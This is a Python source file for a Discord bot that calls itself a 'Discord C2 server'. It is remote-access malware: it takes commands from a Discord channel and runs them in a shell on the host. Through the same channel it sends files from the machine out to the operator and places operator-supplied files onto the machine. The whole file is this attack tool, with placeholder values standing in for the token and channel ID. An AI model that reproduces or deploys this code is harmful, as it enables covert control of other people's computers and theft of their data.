import discord
import asyncio
import logging
import os
from discord import File

DISCORD_TOKEN = "xxxxxxxxxxxxxxx"  # actual token
CHANNEL_ID = "xxxxxxxxxxxxxxxxx"  # actual channel ID

logging.basicConfig(level=logging.INFO)
intents = discord.Intents.all()
bot = discord.Client(intents=intents)

current_directory = os.getcwd()

async def Exec(cmd, working_dir=None):
    try:
        process = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=working_dir
        )
        stdout, stderr = await process.communicate()
        logging.info(f"stdout: {stdout}")
        logging.info(f"stderr: {stderr}")

        if stdout and stdout.strip():
            return stdout.decode("utf-8")
        elif stderr and stderr.strip():
            return stderr.decode("utf-8")
        else:
            return "Command executed, but there was no output."
    except Exception as e:
        logging.error(f"Error executing command: {str(e)}")
        return f"Error executing command: {str(e)}"

async def send_large_message(channel, message):
    for i in range(0, len(message), 2000):
        await channel.send(message[i:i+2000])

async def upload_file(channel, filepath):
    try:
        filepath = filepath.strip('"')
        if os.path.exists(filepath):
            await channel.send(file=File(filepath))
        else:
            await channel.send(f"File '{filepath}' not found.")
    except Exception as e:
        logging.error(f"Error uploading file: {str(e)}")
        await channel.send(f"Error uploading file: {str(e)}")

async def download_file(attachment, save_directory):
    file_path = os.path.join(save_directory, attachment.filename)
    await attachment.save(file_path)
    return file_path

@bot.event
async def on_ready():
    logging.info("Bot is ready and online.")
    channel = bot.get_channel(CHANNEL_ID)
    # Send the welcome message when the bot is online
    await channel.send("Welcome to Discord C2 server by Deku")

@bot.event
async def on_message(message):
    global current_directory
    if message.channel.id == CHANNEL_ID:
        if message.content.startswith("!cmd"):
            command = message.content[len("!cmd "):]
            if command.startswith("cd "):
                target_dir = command[3:].strip()
                if os.path.isdir(target_dir):
                    current_directory = os.path.abspath(target_dir)
                    await message.channel.send(f"Changed directory to: {current_directory}")
                else:
                    await message.channel.send(f"Directory '{target_dir}' not found.")
            elif command.startswith("upload "):
                file_to_upload = command[7:].strip()
                await upload_file(message.channel, file_to_upload)
            elif command.startswith("download"):
                save_dir = current_directory
                if message.attachments:
                    for attachment in message.attachments:
                        saved_path = await download_file(attachment, save_dir)
                        await message.channel.send(f"File saved to: {saved_path}")
                else:
                    await message.channel.send("No file attached for download.")
            else:
                logging.info(f"Executing command: {command} in directory: {current_directory}")
                output = await Exec(command, working_dir=current_directory)
                if len(output) > 2000:
                    await send_large_message(message.channel, output)
                else:
                    await message.channel.send(output)

bot.run(xxxxxxxxxxxxxx)  ## Actual Token 
